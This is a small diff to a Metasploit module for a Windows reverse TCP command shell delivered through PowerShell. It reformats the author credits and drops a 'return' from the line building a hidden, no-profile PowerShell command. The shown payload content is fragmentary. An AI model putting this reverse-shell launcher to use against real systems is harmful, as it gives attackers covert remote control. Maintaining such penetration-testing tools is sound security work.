@@ -17,7 +17,11 @@ module Metasploit3
     super(merge_info(info,
       'Name'          => 'Windows Command Shell, Reverse TCP (via Powershell)',
       'Description'   => 'Connect back and create a command shell via Powershell',
-      'Author'        => ['Ben Campbell', 'Dave Kennedy'],
+      'Author'        =>
+        [
+          'Dave Kennedy', # Original payload at SET
+          'Ben Campbell' # Metasploit module
+        ],
       'License'       => MSF_LICENSE,
       'Platform'      => 'win',
       'Arch'          => ARCH_CMD,
@@ -85,7 +89,7 @@ module Metasploit3
               "}"\
             "}else{RSC}};"\
 
-    return "powershell -w hidden -nop -c #{powershell}"
+    "powershell -w hidden -nop -c #{powershell}"
   end
 
 end
